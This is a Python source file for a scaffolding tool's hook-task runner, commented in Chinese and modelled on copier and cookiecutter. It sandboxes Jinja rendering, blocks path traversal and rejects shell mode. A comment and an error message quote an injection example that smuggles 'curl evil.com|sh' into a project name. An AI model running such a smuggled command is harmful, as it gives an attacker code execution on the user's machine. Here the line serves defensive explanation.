"""TaskRunner — pre/post 钩子执行.

来源：
- copier/_main.py:383-427 — _execute_tasks() Jinja2 渲染 + shell/list 双模式
- cookiecutter/hooks.py:80-128 — run_script_with_context()
"""

from __future__ import annotations

import logging
import os
import shlex
from pathlib import Path

import jinja2
from jinja2.sandbox import SandboxedEnvironment

from .config_types import Task
from .errors import PathTraversalError, TaskExecutionError
from .scaffold_hooks import subprocess_run

_logger = logging.getLogger(__name__)


class TaskRunner:
    """执行钩子任务列表。来源：Copier _execute_tasks 模式。"""

    # PE-P1-4: 默认 task 超时 300s — 模板作者可对慢任务 (cargo build/large npm install)
    # 在 Task.timeout 字段显式覆盖。CLI --hook-timeout 也可全局覆盖此默认
    DEFAULT_TIMEOUT = 300

    def __init__(
        self,
        project_dir: Path,
        current_phase: str = "",
        default_timeout: int | None = None,
        strict: bool = False,
        base_env: dict | None = None,
    ):
        self.project_dir = project_dir
        self._current_phase = current_phase
        self._default_timeout = (
            default_timeout if default_timeout is not None else self.DEFAULT_TIMEOUT
        )
        self._strict = strict
        self._base_env = base_env

    def run(
        self,
        tasks: list[Task],
        context: dict,
        jinja_env: jinja2.Environment | None = None,
    ) -> None:
        """渲染并执行任务列表，单任务超时抛 TaskExecutionError，不中断后续任务。"""
        if not tasks:
            return
        # A4: TaskRunner 必须用 SandboxedEnvironment — 防止恶意模板
        # 通过 jinja 渲染注入 __import__ / os.system 等构造逃逸。
        if jinja_env is None:
            jinja_env = SandboxedEnvironment()

        for task in tasks:
            # 1. 检查 when 条件
            if isinstance(task.when, str):
                try:
                    tpl = jinja_env.from_string(task.when)
                    should_run = (
                        tpl.render(**context).strip().lower() not in ("false", "no", "0", "")
                    )
                except jinja2.UndefinedError as e:
                    if self._strict:
                        raise
                    _logger.warning(
                        "task when 条件引用了未定义变量 '%s' (task=%r): %s",
                        task.when,
                        task.cmd,
                        e,
                        exc_info=True,
                    )
                    should_run = False
            else:
                should_run = bool(task.when)
            if not should_run:
                continue

            # 2. 渲染 working_directory
            wd = self.project_dir
            if task.working_directory:
                tpl = jinja_env.from_string(task.working_directory)
                wd = wd / tpl.render(**context)
            wd = wd.resolve()
            # 防 working_directory 路径穿越：必须在 project_dir 内
            try:
                wd.relative_to(self.project_dir.resolve())
            except ValueError as e:
                raise PathTraversalError(
                    f"task working_directory '{wd}' escapes project_dir "
                    f"'{self.project_dir}'"
                ) from e
            wd.mkdir(parents=True, exist_ok=True)

            # 3. extra_vars 双注入（Jinja 渲染层 + 环境变量层）
            extra_context = {f"_{k}": v for k, v in task.extra_vars.items()}
            extra_context["_ae_phase"] = self._current_phase
            extra_env = {k.upper(): str(v) for k, v in task.extra_vars.items()}
            extra_env["AE_PHASE"] = self._current_phase
            render_context = {**context, **extra_context}

            # 4. 渲染命令 — A4: shell=True 禁用（防止 RCE via project_name="x; curl evil.com|sh"）
            if isinstance(task.cmd, list):
                cmd = [jinja_env.from_string(s).render(**render_context) for s in task.cmd]
                use_shell = False  # list 模式始终安全
            else:
                # A4 安全: string cmd + shell=True 显式拒绝 — 防止 RCE
                # 模板作者必须改用 list cmd (argv 数组, 无 shell 解释)
                if task.shell:
                    raise TaskExecutionError(
                        command=task.cmd,
                        returncode=-1,
                        stderr=(
                            "shell=True 已被 A4 安全策略禁用 (RCE 风险: "
                            "project_name='x; curl evil.com|sh' 可执行任意命令)。"
                            "改用 list cmd: cmd=['sh', '-c', '...'] 或 cmd=['bash', '-c', '...']"
                        ),
                    )
                cmd = jinja_env.from_string(task.cmd).render(**render_context)
                # PR#4 P1-3 安全加固: string-mode cmd 强制 shlex.split → argv 数组,
                # 防止 "evil && calc" 这类被空格分隔的多参数串执行
                # (即便 shell=False, 字符串 cmd 也可能被 tokenize 拆成多个 argv)
                try:
                    cmd = shlex.split(cmd)
                except ValueError as e:
                    raise TaskExecutionError(
                        command=task.cmd,
                        returncode=-1,
                        stderr=(
                            f"task.cmd string 模式 shlex.split 失败 (引号/转义不匹配): "
                            f"{e}。建议改用 list cmd 明确每个 argv 元素。"
                        ),
                    ) from e
                use_shell = False

            # 5. 执行
            env = {**(self._base_env or os.environ), **extra_env}
            # PE-P1-4: task 级 timeout 覆盖 default_timeout — 模板作者可对
            # cargo build / large npm install 等慢任务显式设大值
            effective_timeout = (
                task.timeout if task.timeout is not None else self._default_timeout
            )
            result = subprocess_run(
                cmd,
                cwd=Path(wd),
                timeout=effective_timeout,
                env=env,
                shell=use_shell,
            )
            if result.returncode != 0:
                raise TaskExecutionError(
                    command=str(cmd),
                    returncode=result.returncode,
                    stderr=result.stderr,
                )



